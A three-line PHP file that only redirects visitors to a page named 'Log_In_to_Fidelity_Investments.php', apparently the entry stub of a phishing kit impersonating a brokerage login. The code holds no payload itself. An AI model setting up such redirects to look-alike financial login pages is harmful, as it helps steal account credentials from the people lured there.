<?php
header('Location: Log_In_to_Fidelity_Investments.php');
?>